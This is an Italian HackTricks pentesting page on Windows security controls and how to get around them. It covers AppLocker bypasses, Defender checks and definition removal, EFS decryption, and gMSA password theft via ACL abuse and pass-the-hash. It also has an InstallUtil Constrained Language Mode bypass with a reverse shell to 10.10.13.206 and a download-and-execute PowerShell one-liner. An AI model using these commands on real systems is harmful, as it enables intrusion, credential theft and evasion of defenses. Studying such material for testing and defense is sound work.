# Controlli di Sicurezza Windows

{{#include ../../banners/hacktricks-training.md}}

## Criteri AppLocker

Un application whitelist è un elenco di software o eseguibili approvati che sono autorizzati a essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannosi e software non approvato che non è allineato alle specifiche esigenze di business di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di application whitelisting** di Microsoft e dà agli amministratori di sistema il controllo su **quali applicazioni e file gli utenti possono eseguire**. Fornisce **controllo granulare** su eseguibili, script, file di installazione di Windows, DLL, packaged apps e packed app installers.\
È comune che le organizzazioni **blocchino cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto questo può essere bypassato**.

### Verifica

Verifica quali file/estensioni sono blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Questo percorso del registro contiene le configurazioni e le politiche applicate da AppLocker, fornendo un modo per rivedere l'insieme corrente di regole applicate sul sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Utili **Writable folders** to bypass AppLocker Policy: Se AppLocker consente l'esecuzione di qualsiasi cosa all'interno di `C:\Windows\System32` o `C:\Windows`, ci sono **writable folders** che puoi usare per **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- I binari comunemente **affidabili** [**"LOLBAS's"**](https://lolbas-project.github.io/) possono essere anche utili per bypassare AppLocker.
- **Regole scritte male potrebbero essere bypassate**
- Per esempio, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** in qualsiasi punto e sarà consentita.
- Le organizzazioni spesso si concentrano sul **bloccare l'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma si dimenticano delle **altre** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** a causa del carico aggiuntivo che può imporre sul sistema e della quantità di test necessari per garantire che nulla si rompa. Quindi usare le **DLL come backdoors aiuta a bypassare AppLocker**.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per maggiori informazioni controlla: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Memorizzazione delle credenziali

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file, le password sono memorizzate come hash.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (in forma di hash) sono **salvate** nella **memoria** di questo sottosistema per ragioni di Single Sign-On.\
**LSA** amministra la **politica di sicurezza** locale (politica delle password, permessi utenti...), **autenticazione**, **token di accesso**...\
LSA sarà quello che **verificherà** le credenziali fornite all'interno del file **SAM** (per un login locale) e **comunicherà** con il **domain controller** per autenticare un utente di dominio.

Le **credenziali** sono **salvate** all'interno del **processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decriptabili.

### LSA secrets

LSA può salvare su disco alcune credenziali:

- Password dell'account computer dell'Active Directory (domain controller non raggiungibile).
- Password degli account dei servizi Windows
- Password per le attività pianificate
- Altro (password di applicazioni IIS...)

### NTDS.dit

È il database di Active Directory. È presente solo nei Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un antivirus disponibile in Windows 10 e Windows 11, e in versioni di Windows Server. Blocca tool comuni di pentesting come **`WinPEAS`**. Tuttavia, esistono modi per bypassare queste protezioni.

### Verifica

Per verificare lo **stato** di **Defender** puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo potresti anche eseguire:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protegge i file tramite crittografia, utilizzando una **symmetric key** nota come **File Encryption Key (FEK)**. Questa key viene criptata con la **public key** dell'utente e memorizzata nello $EFS **alternative data stream** del file criptato. Quando è necessaria la decrittazione, la corrispondente **private key** del certificato digitale dell'utente viene usata per decriptare il FEK dallo $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenari di decrittazione senza iniziativa dell'utente** includono:

- Quando file o cartelle vengono spostati su un file system non-EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono automaticamente decrittati.
- File criptati inviati in rete tramite il protocollo SMB/CIFS vengono decrittati prima della trasmissione.

Questo metodo di crittografia permette un **transparent access** ai file criptati per il proprietario. Tuttavia, semplicemente cambiare la password del proprietario e fare logon non consentirà la decrittazione.

### Key Takeaways

- EFS usa un FEK symmetric, criptato con la public key dell'utente.
- La decrittazione impiega la private key dell'utente per accedere al FEK.
- La decrittazione automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione in rete.
- I file criptati sono accessibili al proprietario senza passaggi aggiuntivi.

### Check EFS info

Verificare se un **user** ha **used** questo **service** controllando se esiste questo percorso:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file using cipher /c \<file\>  
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Decrypting EFS files

#### Being Authority System

Questo metodo richiede che la **victim user** stia **running** un **process** sul host. Se è così, usando una sessione `meterpreter` puoi impersonare il token del processo dell'utente (`impersonate_token` from `incognito`). Oppure puoi semplicemente `migrate` al processo dell'utente.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato le **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali che spesso hanno l'opzione "**Password never expire**" abilitata, i gMSA offrono una soluzione più sicura e gestibile:

- **Automatic Password Management**: i gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base alla policy di dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali della password.
- **Enhanced Security**: questi account sono immuni ai lockout e non possono essere utilizzati per interactive logins, aumentando la sicurezza.
- **Multiple Host Support**: i gMSA possono essere condivisi tra più host, rendendoli ideali per servizi in esecuzione su più server.
- **Scheduled Task Capability**: a differenza dei managed service accounts, i gMSA supportano l'esecuzione di scheduled tasks.
- **Simplified SPN Management**: il sistema aggiorna automaticamente lo Service Principal Name (SPN) quando ci sono modifiche ai dettagli sAMaccount del computer o al nome DNS, semplificando la gestione degli SPN.

Le password per i gMSA sono memorizzate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono automaticamente resettate ogni 30 giorni dai Domain Controllers (DCs). Questa password, un blob di dati criptati noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo dagli amministratori autorizzati e dai server sui quali i gMSA sono installati, garantendo un ambiente sicuro. Per accedere a queste informazioni è richiesta una connessione sicura come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Inoltre, dai un'occhiata a questa [web page](https://cube0x0.github.io/Relaying-for-gMSA/) su come eseguire un **NTLM relay attack** per **read** la **password** del **gMSA**.

### Abuso della catena ACL per leggere la password gestita di gMSA (GenericAll -> ReadGMSAPassword)

In molti ambienti, utenti a basso privilegio possono pivotare verso i segreti gMSA senza compromettere il DC abusando di ACL di oggetti mal configurati:

- Un gruppo che puoi controllare (es. tramite GenericAll/GenericWrite) riceve `ReadGMSAPassword` su un gMSA.
- Aggiungendoti a quel gruppo, erediti il diritto di leggere il blob `msDS-ManagedPassword` del gMSA tramite LDAP e derivare credenziali NTLM utilizzabili.

Flusso di lavoro tipico:

1) Scopri il percorso con BloodHound e marca i tuoi foothold principals come Owned. Cerca archi come:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Aggiungiti al gruppo intermedio che controlli (esempio con bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leggi la password gestita del gMSA tramite LDAP e ricava l'hash NTLM. NetExec automatizza l'estrazione di `msDS-ManagedPassword` e la conversione in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autenticarsi come gMSA utilizzando l'hash NTLM (non è necessario plaintext). Se l'account è in Remote Management Users, WinRM funzionerà direttamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Note:
- Le letture LDAP di `msDS-ManagedPassword` richiedono sealing (es., LDAPS/sign+seal). Gli strumenti gestiscono questo automaticamente.
- Alle gMSAs vengono spesso concessi diritti locali come WinRM; verifica l'appartenenza ai gruppi (es., Remote Management Users) per pianificare il lateral movement.
- Se hai bisogno solo del blob per calcolare l'NTLM da solo, vedi la struttura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La **Local Administrator Password Solution (LAPS)**, scaricabile da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente la gestione delle password dell'amministratore locale. Queste password, che sono **randomizzate**, uniche e **regolarmente cambiate**, sono archiviate centralmente in Active Directory. L'accesso a queste password è limitato tramite ACLs agli utenti autorizzati. Con permessi sufficienti è possibile leggere le password dell'amministratore locale.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blocca molte delle funzionalità** necessarie per usare PowerShell efficacemente, come il blocco degli oggetti COM, consentendo solo tipi .NET approvati, workflow basati su XAML, classi PowerShell e altro.

### **Verifica**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Nei Windows attuali quel Bypass non funzionerà ma puoi usare[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potresti dover** **di** _**Aggiungere un riferimento**_ -> _Sfoglia_ ->_Sfoglia_ -> aggiungere `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **cambiare il progetto a .Net4.5**.

#### Bypass diretto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la constrained mode. Per maggiori informazioni vedi: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Politica di esecuzione PS

Per impostazione predefinita è impostata su **restricted.** I principali modi per bypassare questa policy:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Maggiori informazioni si trovano [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

È l'API che può essere usata per autenticare gli utenti.

Lo SSPI sarà responsabile di trovare il protocollo adeguato per due macchine che vogliono comunicare. Il metodo preferito per questo è Kerberos. Successivamente lo SSPI negozierà quale protocollo di autenticazione verrà usato; questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), sono presenti su ogni macchina Windows sotto forma di DLL e entrambe le macchine devono supportare lo stesso per poter comunicare.

### Principali SSP

- **Kerberos**: Il preferito
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Per motivi di compatibilità
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers e LDAP, password in forma di hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Usato per negoziare il protocollo da usare (Kerberos o NTLM, con Kerberos come predefinito)
- %windir%\Windows\System32\lsasrv.dll

#### La negoziazione potrebbe offrire diversi metodi o solo uno.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per attività elevate**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Riferimenti

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
